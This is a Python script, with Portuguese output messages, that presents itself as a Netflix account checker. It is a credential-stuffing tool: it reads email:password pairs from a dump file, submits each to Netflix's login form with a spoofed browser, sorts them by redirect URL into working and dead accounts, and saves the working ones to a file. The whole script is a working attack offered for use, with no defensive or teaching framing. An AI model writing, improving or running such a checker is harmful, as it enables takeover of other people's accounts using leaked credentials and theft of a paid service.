import mechanize
import time

print ('[+]--------- Netflix Account Checker ---------[+]')
time.sleep(2)
workcount = 0
deadcount = 0

accPass=[]
outfile = open('working.txt', 'w')

br = mechanize.Browser()
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)
br.addheaders = [('User-agent', 'Firefox')]

try:
    with open("dump.txt", "r") as filestream:
        for line in filestream:
            br.open('https://www.netflix.com/br/login')
            currentline = line.split(':')
            br.select_form(nr=0)
            br.form['email'] = currentline[0]
            br.form['password'] = currentline[1]
            print('Connecting to ' + br.form['email'])
            response = br.submit()
            if response.geturl() == 'http://www.netflix.com/browse':
                print('Conta Funcionando!')
                workcount = workcount + 1
                br.open('http://www.netflix.com/SignOut?lnkctr=mL')
                accPass.append(currentline[0] + ':' + currentline[1])
                time.sleep(2)
            else:
                print('Conta Morta!')
                deadcount = deadcount + 1
                time.sleep(2)

    print('Copiando contas trabalhando para arquivo txt ..')
    for all in accPass:
        print(all)
        outfile.write(str(all) + '\n')
except:
    print('Ocorreu um erro .. Salvando andamento ...')
    for all in accPass:
        outfile.write(str(all) + '\n')

print('contas funcionando: ' + str(workcount))
print('contas mortas: ' + str(deadcount))
